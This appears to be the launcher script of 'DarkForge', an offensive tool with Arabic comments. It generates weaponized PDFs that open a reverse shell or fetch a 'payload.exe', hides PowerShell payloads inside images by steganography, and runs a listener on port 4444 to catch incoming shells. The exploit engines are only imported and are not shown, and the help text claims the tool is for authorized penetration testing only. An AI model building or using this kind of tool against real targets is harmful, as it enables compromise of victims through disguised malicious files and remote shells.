#!/usr/bin/env python3
"""
DarkForge - Advanced PDF & Image Exploitation Framework
المشغل الرئيسي
"""

import os
import sys
import argparse

# التأكد من وجود المجلدات
os.makedirs('output/pdf', exist_ok=True)
os.makedirs('output/images', exist_ok=True)
os.makedirs('output/payloads', exist_ok=True)
os.makedirs('output/logs', exist_ok=True)

def main():
    parser = argparse.ArgumentParser(
        description='DarkForge - Advanced PDF & Image Exploitation Framework',
        epilog='للاستخدام في اختبارات الاختراق المصرح بها فقط!'
    )
    
    parser.add_argument('--mode', choices=['pdf', 'image', 'server', 'interactive'],
                       default='interactive', help='وضع التشغيل')
    
    parser.add_argument('--technique', help='تقنية الهجوم')
    parser.add_argument('--lhost', help='IP المستقبل')
    parser.add_argument('--lport', type=int, default=4444, help='Port المستقبل')
    parser.add_argument('--image', help='مسار الصورة')
    parser.add_argument('--payload', help='مسار البايلود')
    parser.add_argument('--output', help='مسار الإخراج')
    parser.add_argument('--url', help='رابط التحميل')
    
    args = parser.parse_args()
    
    if args.mode == 'interactive' or len(sys.argv) == 1:
        from darkforge.main import interactive_menu
        interactive_menu()
    
    elif args.mode == 'pdf':
        from darkforge.core.pdf_engine import PDFExploitEngine
        engine = PDFExploitEngine()
        
        params = {
            'lhost': args.lhost or '127.0.0.1',
            'lport': args.lport or 4444,
            'output': args.output or 'output/pdf/exploit.pdf',
            'url': args.url or 'http://127.0.0.1/payload.exe',
            'filename': 'payload.exe'
        }
        
        result = engine.create_exploit_pdf(args.technique or 'reverse_shell', params)
        print(f"[+] تم إنشاء الملف: {result}")
    
    elif args.mode == 'image':
        from darkforge.core.image_stego import ImageSteganographyEngine
        
        if not args.image:
            print("[-] يجب تحديد صورة: --image photo.jpg")
            sys.exit(1)
        
        if not args.payload:
            print("[-] يجب تحديد بايلود: --payload shell.ps1")
            sys.exit(1)
        
        engine = ImageSteganographyEngine()
        result = engine.encode(
            args.technique or 'lsb',
            args.image,
            args.payload,
            args.output or 'output/images/injected.png'
        )
        print(f"[+] تم إنشاء الملف: {result}")
    
    elif args.mode == 'server':
        from darkforge.server.listener import start_listener
        start_listener(host=args.lhost or '0.0.0.0', port=args.lport or 4444)

if __name__ == '__main__':
    main()
